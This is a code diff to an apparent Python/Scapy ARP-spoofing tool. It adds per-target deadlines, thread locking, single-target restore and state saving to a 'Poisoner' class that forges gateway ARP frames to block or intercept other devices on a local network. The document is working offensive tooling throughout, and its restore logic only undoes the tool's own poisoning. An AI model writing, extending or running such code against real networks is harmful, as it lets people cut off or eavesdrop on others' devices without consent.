@@ -40,6 +40,7 @@ RESTORE_GAP = 0.35
 class Target:
     ip: str
     mac: str
+    deadline: float | None = None  # unix time, or None for "until stopped"
 
 
 def _sysctl_key() -> str:
@@ -88,18 +89,32 @@ class Poisoner:
         self._stop = threading.Event()
         self._thread: threading.Thread | None = None
         self._started = False
+        self._lock = threading.RLock()
 
     # -- target management -------------------------------------------------
-    def add(self, ip: str, mac: str) -> None:
+    def add(self, ip: str, mac: str, deadline: float | None = None) -> None:
         if ip == self.net.gateway:
             raise ValueError("the gateway cannot be a target")
-        self.targets[ip] = Target(ip=ip, mac=mac.lower())
+        with self._lock:
+            self.targets[ip] = Target(ip=ip, mac=mac.lower(), deadline=deadline)
 
     def remove(self, ip: str) -> None:
-        self.targets.pop(ip, None)
+        with self._lock:
+            self.targets.pop(ip, None)
 
     def clear(self) -> None:
-        self.targets.clear()
+        with self._lock:
+            self.targets.clear()
+
+    def set_deadline(self, ip: str, deadline: float | None) -> bool:
+        """Arm or clear the auto-restore timer for one target."""
+        with self._lock:
+            target = self.targets.get(ip)
+            if target is None:
+                return False
+            target.deadline = deadline
+        self._save_state()
+        return True
 
     @property
     def active(self) -> bool:
@@ -147,7 +162,7 @@ class Poisoner:
     def _poison_frames(self) -> list:
         gw = self.net.gateway
         frames = []
-        for target in self.targets.values():
+        for target in list(self.targets.values()):
             if self.mode == "block":
                 frames.append(
                     Ether(dst=target.mac)
@@ -164,9 +179,10 @@ class Poisoner:
                 )
         return frames
 
-    def _restore_frames(self, gateway: str, gateway_mac: str) -> list:
+    def _restore_frames(self, gateway: str, gateway_mac: str,
+                        targets: list[Target] | None = None) -> list:
         frames = []
-        for target in self.targets.values():
+        for target in (self.targets.values() if targets is None else targets):
             # target: "the gateway is really at gateway_mac"
             frames.append(
                 Ether(dst=target.mac)
@@ -205,14 +221,39 @@ class Poisoner:
         except FileNotFoundError:
             pass
 
+    def restore_target(self, ip: str) -> bool:
+        """Restore one device now; the others stay poisoned."""
+        with self._lock:
+            target = self.targets.pop(ip, None)
+        if target is None:
+            return False
+
+        gateway_mac = self.gw_mac or getmacbyip(self.net.gateway)
+        if gateway_mac:
+            self.gw_mac = self.gw_mac or gateway_mac
+            frames = self._restore_frames(self.net.gateway, gateway_mac, [target])
+            for _ in range(RESTORE_ROUNDS):
+                try:
+                    _send(frames, self.net.iface)
+                except Exception:
+                    pass
+                time.sleep(RESTORE_GAP)
+
+        if self.targets:
+            self._save_state()
+        else:
+            self.stop()
+        return True
+
     def _save_state(self) -> None:
         data = {
+            "pid": os.getpid(),
             "iface": self.net.iface,
             "gateway": self.net.gateway,
             "gateway_mac": self.gw_mac,
             "mode": self.mode,
             "prev_forward": self._prev_forward,
-            "targets": [asdict(t) for t in self.targets.values()],
+            "targets": [asdict(t) for t in list(self.targets.values())],
         }
         STATE_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")
         os.chmod(STATE_PATH, 0o600)
